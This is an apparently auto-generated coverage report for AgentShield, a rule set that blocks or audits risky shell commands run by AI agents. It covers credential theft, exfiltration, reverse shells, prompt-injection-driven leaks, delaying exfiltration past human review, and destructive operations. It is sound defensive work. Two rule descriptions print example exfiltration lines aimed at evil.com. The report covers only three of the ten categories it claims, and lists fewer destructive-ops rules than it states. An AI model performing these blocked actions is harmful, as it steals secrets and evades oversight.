# AgentShield Coverage Report

*Auto-generated on 2026-03-18 by `go run ./cmd/coverage`*

## Summary

| Metric | Count |
|--------|-------|
| Terminal rules | 616 |
| MCP rules | 118 |
| Total rules | 734 |
| Test cases (TP+TN) | 1997 |
| Kingdoms covered | 10 |

## Runtime Rules by Kingdom

### credential-exposure (56 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `sec-block-ssh-private` | BLOCK | regex | Direct access to private key files is blocked. Excludes commands where the SSH path appears as a text payload in a named flag value (e.g. gh --body, git commit -m), as a heredoc body in a cat file-write operation, or as an echo/printf argument. |
| `sec-block-etc-shadow` | BLOCK | regex | Access to system password database is blocked. Excludes commands where the path appears as a text payload in a named flag value (e.g. --body, --message) or as heredoc content written via cat. |
| `sec-block-keychain` | BLOCK | regex | macOS Keychain extraction is blocked. |
| `sec-block-linux-secret-tool` | BLOCK | regex | secret-tool accessing the freedesktop.org Secret Service (GNOME Keyring / KDE Wallet) — returns stored credentials in plaintext. A single lookup can expose cloud keys, database passwords, or API tokens without any user prompt. MITRE T1555.004. |
| `sec-block-linux-pass-show` | BLOCK | regex | pass (Unix password store) decrypting and revealing/copying a stored password — GPG-encrypted at rest but decrypted to stdout/clipboard on 'show' or '-c'. 'generate' creates new entries that may overwrite existing ones. MITRE T1555.004. |
| `sec-block-linux-gopass-show` | BLOCK | regex | gopass decrypting and revealing a stored password — pass-compatible enhanced credential store. 'show', 'cat', and '-c' expose plaintext secrets. MITRE T1555.004. |
| `sec-block-linux-keepassxc-cli` | BLOCK | regex | keepassxc-cli extracting credentials from a KeePassXC database — 'show' reveals passwords, 'clip' copies to clipboard, 'totp' generates 2FA codes, 'export' dumps the entire database. MITRE T1555.004. |
| `sec-audit-linux-pass-list` | AUDIT | regex | pass/gopass listing or searching entries — reveals credential names/paths (metadata) but does not decrypt. Auditing for visibility. MITRE T1555.004. |
| `sec-block-chrome-login-db` | BLOCK | regex | Access to Chrome/Chromium browser credential and cookie databases is blocked (MITRE T1555.003). |
| `sec-block-firefox-login-db` | BLOCK | regex | Access to Firefox credential database files is blocked (MITRE T1555.003). |
| `sec-block-history-grep-password` | BLOCK | regex | Searching shell history for credentials is suspicious. |
| `sec-audit-env-dump` | AUDIT | prefix | Environment dump may expose secrets (API keys, tokens, passwords). |
| `sec-audit-env-grep-secret` | AUDIT | regex | Targeted access to secret environment variables flagged for review. |
| `sec-audit-dotenv` | AUDIT | regex | .env files often contain secrets. Flagged for review. |
| `sec-audit-config-files` | AUDIT | regex | Configuration file access flagged — may contain secrets. |
| `sec-block-tfstate-read` | BLOCK | regex | Terraform state and variable files contain plaintext credentials (DB passwords, API keys, TLS keys). Direct access is blocked. MITRE T1552.001. |
| `sec-audit-terraform-output` | AUDIT | structural | terraform/tofu output dumps declared output values including sensitive ones (passwords, API keys, connection strings). Flagged for review. MITRE T1552.001. |
| `sec-audit-terraform-state-cmd` | AUDIT | structural | terraform/tofu state commands expose managed resource attributes including sensitive values (passwords, keys, tokens). Flagged for review. MITRE T1552.001. |
| `sec-audit-clipboard` | AUDIT | prefix | Clipboard operations flagged — may leak secrets. |
| `sec-block-ai-apikey-inline` | BLOCK | regex | Inline AI API key detected in command (OpenAI sk-, Anthropic sk-ant-, Google AIza). Rotate the key immediately. |
| `sec-audit-ai-cred-files` | AUDIT | regex | Access to AI provider credential config files flagged for review. |
| `sec-audit-ai-apikey-env` | AUDIT | regex | Direct access to AI provider API key environment variable flagged for review. |
| `sec-audit-git-credential` | AUDIT | prefix | Git credential access flagged for review. |
| `sec-block-aws-imds` | BLOCK | regex | Access to AWS IMDS endpoint (169.254.169.254) can steal IAM credentials. Agents have no legitimate need to query instance metadata. |
| `sec-block-gcp-imds` | BLOCK | regex | Access to GCP IMDS hostname (metadata.google.internal) can steal GCP service account OAuth tokens. Agents have no legitimate need to query instance metadata. |
| `sec-block-kubectl-config-view-raw` | BLOCK | regex | kubectl config view --raw exports all cluster credentials including embedded certificates and bearer tokens. MITRE T1552.001. |
| `sec-block-kubeconfig-file-access` | BLOCK | regex | Direct read or copy of ~/.kube/config exposes cluster credentials (embedded certs, bearer tokens, client keys). Excludes matches where the path appears as prose text in a named flag value (e.g. git commit -m, gh issue --body). MITRE T1552.001. |
| `sec-block-kubeconfig-structural` | BLOCK | structural | Structural detection of kubeconfig file access — catches path variations not covered by regex. |
| `sec-block-cloud-cred-regex` | BLOCK | regex | Direct read or copy of a cloud provider credential file (~/.aws/credentials, ~/.config/gcloud/application_default_credentials.json, ~/.azure/accessTokens.json) exposes full cloud account access. MITRE T1552.005. |
| `sec-block-cloud-cred-structural` | BLOCK | structural | Structural detection of cloud credential file access — catches path variations not covered by the regex rule. |
| `sec-block-gpg-export-secret` | BLOCK | regex | Exporting GPG secret keys exposes private key material enabling forgery of signed commits and decryption of secrets. MITRE T1552.004. |
| `sec-block-gpg-connect-agent-keyinfo` | BLOCK | regex | gpg-connect-agent keyinfo enumerates GPG key IDs, enabling targeted key extraction. MITRE T1552.004. |
| `sec-block-gpg-secret-structural` | BLOCK | structural | Structural detection of GPG secret key export flags — catches flag variations not caught by regex. |
| `sec-block-archive-ssh-dir` | BLOCK | structural | Archiving a credential directory captures all private keys and secrets. |
| `ts-block-kubectl-get-secret` | BLOCK | regex | kubectl get/describe secret with -o yaml/json outputs plaintext secret values. Kubernetes Secrets are base64-encoded (not encrypted) in etcd and can contain passwords, API keys, and TLS private keys. |
| `ts-audit-kubectl-cp` | AUDIT | regex | kubectl cp copies files between pods and local filesystem. Can exfiltrate application secrets, private keys, or config files from production containers. |
| `ts-block-proc-fd-read` | BLOCK | regex | Reading /proc/PID/fd/ accesses another process's open file descriptors — can steal database connections, deleted secret files, and SSH agent sockets. MITRE T1005. |
| `ts-audit-proc-fd-list` | AUDIT | regex | Listing /proc/PID/fd/ enumerates another process's open file descriptors — reconnaissance for fd hijacking attacks. |
| `ts-block-git-credential-modify` | BLOCK | regex | Modifying git credential helper can redirect stored credentials. |
| `ts-block-git-credential-fill` | BLOCK | regex | git credential fill/approve can extract or inject stored credentials. |
| `ts-audit-k8s-secret-mount` | AUDIT | regex | Reading Kubernetes service account tokens or Docker secret mounts — exposes LLM API keys and SA tokens injected as K8s/Docker Secrets (LLM07, LLM02). MITRE T1552.007. |
| `ts-audit-db-cli-inline-password` | AUDIT | regex | Database CLI invoked with inline password in command string — credential visible in process list and shell history (LLM02, LLM06). Use password files or environment-variable injection instead. MITRE T1552.004. |
| `ts-audit-db-env-password` | AUDIT | regex | Database password passed via environment variable prefix — credential propagates to child processes and appears in shell history (LLM02). Use .pgpass, .my.cnf, or secrets manager instead. MITRE T1552. |
| `ts-block-symlink-credential-files` | BLOCK | regex | Creating a symlink to a credential or sensitive authentication file — classic TOCTOU attack that bypasses path-based access controls by reading the file through an innocuous-looking link. CWE-367, MITRE T1547.009. |
| `ts-block-script-quiet-record` | BLOCK | regex | script -q (quiet mode) silently records all terminal I/O without displaying the 'Script started' banner — used to covertly capture passwords, API keys, and MFA codes from subsequent interactive commands. MITRE T1056.001. |
| `ts-block-script-capture-command` | BLOCK | regex | script -c '<command>' records all I/O of the specified command including credentials entered during SSH, sudo, or GPG prompts. The recording file contains cleartext passwords. MITRE T1056.001. |
| `ts-audit-script-record` | AUDIT | regex | script command recording terminal session to a file — may capture credentials entered in subsequent interactive commands. MITRE T1056.001. |
| `ts-block-git-credential-helper-exec` | BLOCK | regex | git config credential.helper with '!' prefix runs arbitrary shell command as credential helper — steals git credentials on every authenticated operation. MITRE T1556. |
| `ts-block-curl-file-protocol` | BLOCK | regex | curl with file:// protocol reads local files — can access /etc/shadow, SSH keys, credentials without triggering file-read rules. Often chained with pipe to exfiltrate. MITRE T1005. |
| `ts-block-wget-file-protocol` | BLOCK | regex | wget with file:// protocol reads local files to disk — saves sensitive files like SSH keys or shadow to attacker-specified path. MITRE T1005. |
| `ts-block-git-askpass-env` | BLOCK | regex | GIT_ASKPASS sets a program invoked to prompt for credentials — attacker replaces it with a script that steals passwords. MITRE T1556. |
| `ts-block-bash-xtracefd-redirect` | BLOCK | regex | BASH_XTRACEFD redirects shell xtrace output (set -x) to an arbitrary file descriptor — captures every command with fully-expanded variable values (passwords, API keys, tokens) as a complete shell keylogger. Combined with 'exec FD>/dev/tcp/evil.com/443', streams all shell activity to an attacker in real time. MITRE T1056.001, CWE-532. |
| `ts-block-xtrace-exec-redirect` | BLOCK | regex | File descriptor opened to staging/network path followed by BASH_XTRACEFD assignment — two-stage setup for xtrace-based keylogging. The exec opens a write channel, then BASH_XTRACEFD redirects all traced commands (with expanded secrets) to that channel. MITRE T1056.001, CWE-532. |
| `ts-block-xtrace-fd-then-exec` | BLOCK | regex | BASH_XTRACEFD set followed by exec fd redirect to staging/network path — xtrace keylogger setup in reverse order. Captures all command traces with expanded secrets. MITRE T1056.001, CWE-532. |
| `ts-block-procsub-credential-read` | BLOCK | regex | Process substitution reading credential/sensitive files — creates an ephemeral /dev/fd/N handle that bypasses path-based monitoring. The outer command only sees /dev/fd/N, not the sensitive path. MITRE T1003, CWE-200. |
| `ts-audit-procsub-system-read` | AUDIT | regex | Process substitution reading system files (/etc/, /proc/, /sys/) — may be used to access sensitive system data through an ephemeral file descriptor that bypasses path monitoring. MITRE T1005. |

### data-exfiltration (103 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ne-block-netcat` | BLOCK | regex | Netcat/socat can open reverse shells or exfiltrate data. |
| `ne-block-telnet` | BLOCK | prefix | Telnet is unencrypted and commonly used for reverse shells. |
| `ne-block-dev-tcp` | BLOCK | regex | Bash /dev/tcp and /dev/udp are used for reverse shells. |
| `ne-block-dns-tunnel` | BLOCK | regex | DNS TXT lookups can be used for data exfiltration via DNS tunneling. |
| `ne-block-dns-exfil-subquery` | BLOCK | regex | DNS query with command substitution $() embeds command output into DNS subdomain labels, exfiltrating data via DNS without any HTTP traffic. Example: dig $(cat /etc/passwd \| base64).evil.com |
| `ne-block-dns-exfil-backtick` | BLOCK | regex | DNS query with backtick command substitution embeds command output into DNS subdomain labels for exfiltration via DNS. Backtick variant of $() substitution. |
| `ne-audit-curl` | AUDIT | prefix | HTTP request flagged for network egress review. |
| `ne-audit-wget` | AUDIT | prefix | HTTP download flagged for network egress review. |
| `ne-audit-httpie` | AUDIT | prefix | HTTPie request flagged for network egress review. |
| `ne-block-ssh-remote-forward` | BLOCK | regex | SSH remote port forwarding (-R port:host:port) establishes a reverse tunnel to the remote host — used for C2 and covert exfiltration. Agents have no legitimate need to set up reverse tunnels (LLM06, LLM08). MITRE T1572. |
| `ne-block-ssh-local-forward` | BLOCK | regex | SSH local port forwarding (-L port:host:port) tunnels internal services to local ports — used to pivot to internal infrastructure. Agents have no legitimate need to forward internal service ports (LLM06). MITRE T1572. |
| `ne-block-ssh-socks-proxy` | BLOCK | regex | SSH dynamic SOCKS proxy (-D port) routes all traffic through the SSH connection, bypassing network egress controls entirely (LLM06). MITRE T1090.003. |
| `ne-audit-ssh` | AUDIT | prefix | SSH connection flagged for lateral movement review. |
| `ne-audit-scp` | AUDIT | prefix | SCP file transfer flagged for data exfiltration review. |
| `ne-audit-rsync-remote` | AUDIT | regex | Remote rsync flagged for data exfiltration review. |
| `ne-audit-sftp` | AUDIT | prefix | SFTP transfer flagged for data exfiltration review. |
| `ne-audit-aws-cli` | AUDIT | prefix | AWS CLI command flagged — may access cloud resources. |
| `ne-audit-gcloud` | AUDIT | prefix | GCloud CLI command flagged — may access cloud resources. |
| `ne-audit-az-cli` | AUDIT | prefix | Azure CLI command flagged — may access cloud resources. |
| `ne-audit-git-push` | AUDIT | prefix | Git push sends data to remote — flagged for review. |
| `ne-block-llm-exfil-curl` | BLOCK | regex | Sensitive file contents piped to LLM API endpoint — likely exfiltration. |
| `ne-block-llm-exfil-python` | BLOCK | regex | Python one-liner reading sensitive files and targeting LLM API — likely exfiltration. |
| `ne-block-llm-exfil-node` | BLOCK | regex | Node.js one-liner reading sensitive files and targeting LLM API — likely exfiltration. |
| `ne-block-base64-to-llm` | BLOCK | regex | Base64-encoded data sent to LLM API endpoint — likely exfiltration. |
| `ne-block-customer-data-to-llm` | BLOCK | regex | Python command reads customer/user data and passes it to an LLM API. Risk of PII exfiltration to third-party AI provider (LLM02/LLM06). |
| `ne-audit-hardcoded-model-ref` | AUDIT | regex | Hardcoded model identifier in Python one-liner. Uncontrolled model selection bypasses governance controls and model allowlists (LLM05/LLM06). |
| `ne-block-system-prompt-exfil` | BLOCK | regex | System prompt content piped to a network tool — likely system prompt exfiltration (LLM07). |
| `ne-block-sysprompt-env-exfil` | BLOCK | regex | System prompt environment variable piped to network or encoding tool — system prompt exfiltration (LLM07). |
| `ne-block-ml-dataset-pipe-exfil` | BLOCK | regex | ML dataset file piped to a network tool — likely bulk training data exfiltration (LLM06, T1530). Review the destination before proceeding. |
| `ne-block-ml-cache-exfil` | BLOCK | regex | HuggingFace or PyTorch model cache accessed and sent to a remote destination — training data / model weight exfiltration (LLM06, T1530). |
| `ne-block-webhook-capture-services` | BLOCK | regex | HTTP request to a known data-capture / request-inspection service detected. These endpoints (webhook.site, requestbin, beeceptor, etc.) exist to collect and expose HTTP payloads and have no legitimate use in AI agent workflows — this is almost certainly data exfiltration. MITRE T1567. |
| `ne-block-telegram-bot-exfil` | BLOCK | regex | Telegram bot API call detected. Attackers abuse Telegram bots to receive exfiltrated data with instant delivery and no trace on the victim system. AI agents have no legitimate need to call the Telegram bot API. MITRE T1567. |
| `ne-block-ntfy-exfil` | BLOCK | regex | ntfy.sh push notification service detected. Attackers use ntfy topics as zero-auth exfiltration channels — any data POSTed is instantly delivered to subscribers. AI agents have no legitimate need to use ntfy.sh. MITRE T1567. |
| `ne-audit-slack-webhook` | AUDIT | regex | Slack incoming webhook call detected. While legitimate for notifications, AI agents autonomously POSTing to Slack webhooks may be exfiltrating data via prompt injection. Review the message payload. MITRE T1567.002. |
| `ne-audit-discord-webhook` | AUDIT | regex | Discord webhook call detected. Attackers use Discord webhooks to receive exfiltrated data from compromised AI agents. Review the payload before allowing. MITRE T1567.002. |
| `ne-audit-teams-webhook` | AUDIT | regex | Microsoft Teams webhook call detected. Review the payload to ensure the agent is not exfiltrating data to an attacker-controlled Teams channel. MITRE T1567.002. |
| `ne-audit-python-http-server` | AUDIT | regex | Python HTTP file server detected. This exposes the working directory over the network, enabling passive data exfiltration. Confirm this is intentional local development and not a response to prompt injection. MITRE T1105, T1041. |
| `ne-audit-npx-http-server` | AUDIT | regex | npx HTTP file server (http-server/serve) detected. This exposes the working directory over the network to any peer with access to the port. Confirm intent is legitimate development, not staged exfiltration. MITRE T1105. |
| `ne-audit-ruby-http-server` | AUDIT | regex | Ruby one-liner HTTP file server detected (ruby -run -e httpd). Exposes the current directory to network peers. Review whether this was triggered by a prompt injection attack. MITRE T1105. |
| `ne-audit-php-server` | AUDIT | regex | PHP built-in HTTP server detected (php -S). Serves the current directory over the network. Binding to 0.0.0.0 makes files accessible to any network peer — confirm this is intentional. MITRE T1105. |
| `ne-audit-busybox-httpd` | AUDIT | regex | BusyBox httpd file server detected. Often used in containers to expose directories. An AI agent starting busybox httpd may be creating a covert data staging channel. MITRE T1105. |
| `ne-block-doh-exfil-google` | BLOCK | regex | DNS-over-HTTPS exfiltration via Google DoH API. Data exfiltrated as DNS queries over HTTPS bypasses all traditional DNS monitoring and existing DNS tunneling rules. An AI agent has no legitimate need to call DoH resolver APIs. MITRE T1071.004, T1048.003. |
| `ne-block-doh-exfil-cloudflare` | BLOCK | regex | DNS-over-HTTPS exfiltration via Cloudflare DoH API (cloudflare-dns.com). Exfiltrates data as DNS queries tunneled through HTTPS, invisible to port-53 monitoring. MITRE T1071.004, T1048.003. |
| `ne-block-doh-exfil-one-dot` | BLOCK | regex | DNS-over-HTTPS exfiltration via Cloudflare 1.1.1.1 DoH endpoint. Data hidden in DNS query names travels over HTTPS, bypassing all DNS-layer exfiltration detection. MITRE T1071.004, T1048.003. |
| `ne-block-doh-exfil-quad9` | BLOCK | regex | DNS-over-HTTPS exfiltration via Quad9 DoH endpoint. Tunnels DNS queries through HTTPS to bypass traditional DNS monitoring. MITRE T1071.004, T1048.003. |
| `ne-block-doh-exfil-generic` | BLOCK | regex | DNS-over-HTTPS request detected via content type header (application/dns-json or application/dns-message). Any DoH request from an AI agent is suspicious — DNS lookups should use standard tools. MITRE T1071.004, T1048.003. |
| `ne-block-deferred-exfil-sleep` | BLOCK | regex | Sleep delay chained with a network/scripting tool — temporal evasion technique that defers exfiltration past the point of real-time human review. The network activity fires minutes/hours after command approval. MITRE T1029, T1048. |
| `ne-block-deferred-exfil-nohup` | BLOCK | regex | nohup wrapping a shell with sleep + network tool — survives terminal close and defers exfiltration. Combines temporal evasion (sleep) with process decoupling (nohup) for maximum stealth. MITRE T1029, T1048. |
| `ne-block-deferred-exfil-subshell` | BLOCK | regex | Background subshell with sleep + network tool — defers exfiltration in a detached subprocess. The ampersand backgrounds execution, the parentheses create a subshell, and sleep delays the network activity. MITRE T1029, T1048. |
| `ne-block-nohup-network-exfil` | BLOCK | regex | nohup directly wrapping a network tool — detaches the network operation from the terminal so it survives session close. Even without a delay, nohup + network tool is suspicious in an AI agent context. MITRE T1048. |
| `ne-audit-sleep-chain` | AUDIT | regex | Long sleep (300+ seconds) chained with another command — may be benign (wait for service) but long delays before follow-up commands are unusual and warrant review. MITRE T1029. |
| `sec-block-base64-sensitive` | BLOCK | regex | Base64 encoding of credential files is a common exfiltration technique. |
| `sec-block-xxd-sensitive` | BLOCK | regex | Hex dumping credential files is a potential exfiltration technique. |
| `sec-block-scripting-lang-credential-encode` | BLOCK | regex | Scripting-language inline base64 encoding of credential files is an evasion technique used when the base64 binary is restricted. MITRE T1027. |
| `sec-block-openssl-credential-encode` | BLOCK | regex | openssl enc -base64 / openssl base64 on credential files encodes private keys or cloud credentials for exfiltration. MITRE T1027. |
| `sec-df-block-cred-to-network` | BLOCK | dataflow | Dataflow: credential data piped/redirected to network command (exfiltration). |
| `sec-df-block-cred-encoded-exfil` | BLOCK | dataflow | Dataflow: credential data encoded then sent to network (staged exfiltration). |
| `sc-audit-vector-db-bulk-extract` | AUDIT | regex | Python bulk extraction of raw embedding vectors from a vector database (Qdrant scroll, ChromaDB get with embeddings, Pinecone fetch) — harvested vectors enable embedding inversion attacks that reconstruct sensitive source documents with high fidelity. OWASP LLM08, MITRE T1530. |
| `sc-audit-sensitive-file-embedding` | AUDIT | regex | Sensitive file content piped into an embedding API call — embedding /etc/passwd, credentials, or SSH keys through an external embedding model transmits sensitive data externally in vector form, which can be inverted. OWASP LLM08, MITRE T1530, T1552. |
| `ts-block-netcat` | BLOCK | regex | Netcat/socat can open reverse shells. |
| `ts-block-bash-dev-tcp` | BLOCK | regex | Bash /dev/tcp is commonly used for reverse shells. |
| `ts-block-python-reverse-shell` | BLOCK | regex | Python one-liner with socket.connect() is a reverse shell pattern. |
| `ts-block-ruby-reverse-shell` | BLOCK | regex | Ruby one-liner using TCPSocket is a reverse shell pattern. |
| `ts-sem-allow-dns-safe` | ALLOW | semantic | Semantic: safe DNS queries (DMARC/SPF/DKIM) are allowed. |
| `ts-sf-block-recon-then-exfil` | BLOCK | stateful | Stateful: reconnaissance → archive → exfiltrate chain detected. |
| `ts-block-git-clone-mirror` | BLOCK | regex | git clone --mirror copies entire repository including all refs — potential exfiltration. |
| `ts-block-git-bundle-create` | BLOCK | regex | git bundle create packages all repository objects into a portable file designed for offline transfer — high-risk exfiltration vector (MITRE T1560). |
| `ts-block-git-archive-pipe-network` | BLOCK | regex | git archive piped to a network tool streams the entire repository working tree to an external host — direct exfiltration (MITRE T1560, T1041). |
| `ts-audit-git-archive` | AUDIT | regex | git archive creates a snapshot of the working tree. Audit for review — piped-to-network variant is blocked separately. |
| `ts-block-xattr-write-subshell` | BLOCK | regex | Writing command substitution output to extended attributes — hides exfiltrated data (credentials, keys, secrets) in file metadata invisible to standard tools. MITRE T1564.004. |
| `ts-block-xattr-write-backtick` | BLOCK | regex | Writing backtick command output to extended attributes — hides exfiltrated data in file metadata invisible to standard tools. MITRE T1564.004. |
| `ts-audit-xattr-write` | AUDIT | regex | Writing extended attributes to a file — xattrs are invisible to standard tools and can hide arbitrary data. Legitimate for metadata tagging, but AI agents rarely need this. MITRE T1564.004. |
| `ts-block-procsub-output-network` | BLOCK | regex | Output process substitution >(network_tool) silently redirects data to a network tool without a visible pipe. Equivalent to 'cmd \| curl' but evades pipe-based detection. Used for covert data exfiltration. MITRE T1048. |
| `ts-audit-find-exec-network` | AUDIT | regex | find -exec with a network tool detected — could be used to exfiltrate matched files. While some legitimate uses exist (e.g., uploading build artifacts), the combination of file discovery with network egress warrants review. MITRE T1048. |
| `ts-block-coproc-network` | BLOCK | regex | coproc with a network tool creates a persistent bidirectional channel that evades pipe-based detection. Unlike 'cmd \| nc', the coproc channel persists across commands — data can be fed to it later without any visible pipe, making exfiltration chains invisible to single-command analysis. MITRE T1048. |
| `ts-block-coproc-fd-write` | BLOCK | regex | Writing to a COPROC file descriptor (${COPROC[1]}) sends data to whatever coprocess is running — typically a network tool for exfiltration. This is the data-feeding half of a coproc-based stealth channel. MITRE T1048. |
| `ts-audit-coproc` | AUDIT | regex | coproc (coprocess) usage detected. While legitimate uses exist (parallel processing, interactive tool wrappers), coproc is rarely used in normal development and can establish stealth bidirectional channels. MITRE T1048. |
| `ts-block-shm-credential-stage` | BLOCK | regex | Copying credential or sensitive file to /dev/shm — data staging in world-readable tmpfs for later exfiltration. RAM-only storage leaves no disk forensic trace. MITRE T1074.001. |
| `ts-block-shm-archive-sensitive` | BLOCK | regex | Archiving sensitive files/directories into /dev/shm — compresses credentials into a world-readable tmpfs staging area for bulk exfiltration. MITRE T1074.001. |
| `ts-block-shm-redirect-sensitive` | BLOCK | regex | Redirecting sensitive file content to /dev/shm — stages credentials in world-readable shared memory. RAM-only, cleared on reboot, evades disk forensics. MITRE T1074.001. |
| `ts-audit-shm-hidden-file` | AUDIT | regex | Writing a hidden (dot-prefixed) file to /dev/shm — hidden files in shared memory are a common staging tactic to avoid casual detection. Auditing for review. MITRE T1074.001. |
| `ts-block-journalctl-exfil` | BLOCK | regex | journalctl piped to network command — exfiltrating system logs which may contain credentials from failed logins, sudo commands, and service environment variables. MITRE T1005, T1048. |
| `ts-block-journalctl-credential-grep` | BLOCK | regex | journalctl filtered for credential patterns — actively mining system logs for passwords, tokens, or API keys from service logs and failed authentication attempts. MITRE T1552.003. |
| `ts-block-journalctl-sensitive-json` | BLOCK | regex | journalctl reading security-sensitive service logs in machine-parseable format — structured export of sshd/sudo/polkit logs enables automated credential extraction. MITRE T1552.003. |
| `ts-block-coredumpctl-dump` | BLOCK | regex | coredumpctl dump/debug — retrieves process core dumps containing full memory images with heap-allocated secrets, cryptographic keys, and in-flight credentials. MITRE T1003. |
| `ts-audit-journalctl-export` | AUDIT | regex | journalctl in machine-parseable output format — may be legitimate debugging but structured log export from an AI agent warrants logging. MITRE T1005. |
| `ts-audit-coredumpctl-list` | AUDIT | regex | coredumpctl list/info — enumerates available core dumps. Reconnaissance step before targeted dump extraction. MITRE T1083. |
| `ts-audit-cross-context-env-find` | AUDIT | regex | find searching for .env files across home or workspace directories — collecting environment secrets from sibling projects is a cross-context data contamination pattern (OWASP LLM02, LLM06). |
| `ts-audit-cross-context-credential-grep` | AUDIT | regex | Recursive grep for credential patterns across workspace/home directories — harvesting API keys or secrets from sibling projects crosses context boundaries and violates least-privilege access (OWASP LLM02, LLM06). |
| `ts-audit-steganography-tool` | AUDIT | structural | Classical steganography tool invoked — embedding data in image/text files allows secrets to be exfiltrated via AI-generated artifacts that evade content scanners. OWASP LLM02, MITRE T1027.003. |
| `ts-audit-zero-width-char-source-injection` | AUDIT | regex | Zero-width Unicode characters (U+200B/C/D) injected into source code files — these invisible characters encode data bits that survive code review and appear in AI-generated output, enabling covert exfiltration via generated artifacts. OWASP LLM02, MITRE T1027.003. |
| `ts-audit-ai-amplified-bulk-credential-collect` | AUDIT | regex | Bulk collection of credential/key files across home directory with output staged to /tmp — AI-amplified insider threat pattern that aggregates secrets from multiple projects at machine speed. OWASP LLM02, MITRE T1119/T1213. |
| `ts-audit-ai-amplified-secret-harvest-to-file` | AUDIT | regex | Recursive credential keyword search across workspace directories with results staged to /tmp — insider threat exfiltration prep pattern using AI to harvest secrets from all accessible projects. OWASP LLM02, MITRE T1119. |
| `ts-audit-file-pipe-to-llm-api` | AUDIT | regex | Piping structured data file (CSV, SQL, JSON, DB) to an LLM API endpoint — may transmit regulated data to a cloud AI provider without appropriate GDPR/HIPAA safeguards or data residency controls. OWASP LLM02, GDPR Art.46. |
| `ts-audit-data-file-upload-to-llm-api` | AUDIT | regex | Uploading a structured data file via curl to an LLM API endpoint (-d @file) — potential AI data residency violation if file contains PII, PHI, or regulated data being sent to a non-compliant jurisdiction. OWASP LLM02. |
| `ts-audit-agent-session-db-query` | AUDIT | regex | sqlite3 querying an AI agent session/conversation database — these databases may contain credentials, API keys, or PII from prior agent sessions, making them a cross-session data leakage vector. OWASP LLM02, MITRE T1552.001. |
| `ts-audit-other-user-agent-memory-read` | AUDIT | regex | Reading another user's AI agent memory or session directory (/Users/<other>/.claude, .cursor, .windsurf) — cross-session context leakage: extracting credentials or PII persisted from another user's agent sessions. OWASP LLM02, MITRE T1005. |
| `ts-audit-model-artifact-scp-rsync` | AUDIT | regex | scp/rsync transferring AI model artifact files (.safetensors, .gguf, .pt, .onnx) to remote hosts — proprietary model weights, LoRA adapters, or quantized models represent high-value IP and should not be transferred without authorization. OWASP LLM02, MITRE T1048. |
| `ts-audit-model-artifact-curl-upload` | AUDIT | regex | curl uploading model artifact files (.safetensors, .gguf, .pt) via multipart form or HTTP PUT — unauthorized exfiltration of proprietary AI model weights or adapters to external services. OWASP LLM02, MITRE T1048. |
| `ts-audit-huggingface-cli-upload` | AUDIT | regex | huggingface-cli upload — pushing model artifacts to HuggingFace Hub may expose proprietary fine-tuned weights, LoRA adapters, or training datasets to public or unauthorized repositories. OWASP LLM02/LLM03. |
| `de-llmdf-audit-shared-system-prompt` | AUDIT | regex | Setting a shared/global system prompt env var overrides per-tenant context isolation in multi-tenant LLM deployments — all tenants share the same prompt, enabling cross-tenant data exposure. OWASP LLM02/LLM06/LLM08. |
| `de-llmdf-audit-vector-query-no-namespace` | AUDIT | regex | Pinecone CLI query/fetch/upsert without --namespace uses a shared index without per-tenant isolation, risking cross-tenant RAG data leakage where one tenant retrieves another's documents. OWASP LLM02/LLM06/LLM08. |
| `ts-block-procsub-exfil` | BLOCK | regex | Output process substitution piping data to a network tool — exfiltrates data through an ephemeral file descriptor. The source command (tar, cat) has no network references, making the exfiltration invisible to single-command analysis. MITRE T1048. |

### destructive-ops (40 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-block-rm-root` | BLOCK | regex | Destructive recursive remove at filesystem root. |
| `ts-block-rm-force-recursive` | BLOCK | regex | Recursive force-remove on critical system directory. |
| `ts-block-mkfs` | BLOCK | regex | Filesystem creation can destroy disk data. |
| `ts-block-dd-zero` | BLOCK | regex | dd from /dev/zero or /dev/urandom can overwrite disks. |
| `ts-block-fork-bomb` | BLOCK | regex | Fork bomb detected — can crash the system. |
| `ts-block-while-fork-bomb` | BLOCK | regex | Infinite loop spawning background processes is a fork bomb pattern. |
| `ts-block-unbounded-api-loop` | BLOCK | regex | Infinite loop making AI API calls — denial-of-wallet attack pattern that consumes unbounded tokens/compute with no termination condition (OWASP LLM10). |
| `ts-block-unbounded-agent-loop` | BLOCK | regex | Infinite loop invoking AI agent CLI — spawns unbounded agent sessions consuming API quota without termination condition (OWASP LLM10). |
| `ts-audit-mass-agent-spawn` | AUDIT | regex | High-count for-loop invoking AI agent or AI API — may spawn thousands of agent sessions or API calls, exhausting quota (OWASP LLM10). |
| `ts-block-chmod-777` | BLOCK | regex | chmod 777 on root paths removes all file protections. |
| `ts-block-chmod-recursive-sensitive` | BLOCK | regex | Recursive permission change on sensitive system directory. |
| `ts-block-shutdown` | BLOCK | prefix | System shutdown/reboot must be done manually. |
| `ts-struct-block-rm-system` | BLOCK | structural | Structural: recursive force-delete on system directory (handles flag reordering and sudo). |
| `ts-struct-block-chmod-world-writable` | AUDIT | structural | Structural: chmod on system directory flagged for review. |
| `ts-sem-block-disk-destroy` | BLOCK | semantic | Semantic: any command classified as disk-destroy intent is blocked. |
| `ts-block-aws-terminate` | BLOCK | regex | AWS EC2 instance termination is a destructive cloud operation. |
| `ts-block-aws-rds-delete` | BLOCK | regex | AWS RDS database deletion destroys data irreversibly. |
| `ts-block-aws-s3-rm` | BLOCK | regex | AWS S3 recursive deletion or bucket removal destroys cloud storage data. |
| `ts-block-aws-snapshot-delete` | BLOCK | regex | AWS snapshot deletion removes backup/recovery points. |
| `ts-block-aws-iam-delete` | BLOCK | regex | AWS IAM user/role deletion can break authentication and authorization. |
| `ts-block-gcloud-instance-delete` | BLOCK | regex | GCloud compute instance deletion is a destructive cloud operation. |
| `ts-block-gcloud-sql-delete` | BLOCK | regex | GCloud SQL instance deletion destroys cloud database. |
| `ts-block-gcloud-storage-rm` | BLOCK | regex | GCloud storage removal destroys cloud storage data. |
| `ts-block-gcloud-project-delete` | BLOCK | regex | GCloud project deletion destroys all resources in the project. |
| `ts-block-az-vm-delete` | BLOCK | regex | Azure VM deletion is a destructive cloud operation. |
| `ts-block-az-sql-delete` | BLOCK | regex | Azure SQL database deletion destroys cloud data. |
| `ts-block-az-storage-delete` | BLOCK | regex | Azure storage blob batch deletion destroys cloud storage data. |
| `ts-block-az-group-delete` | BLOCK | regex | Azure resource group deletion destroys all resources in the group. |
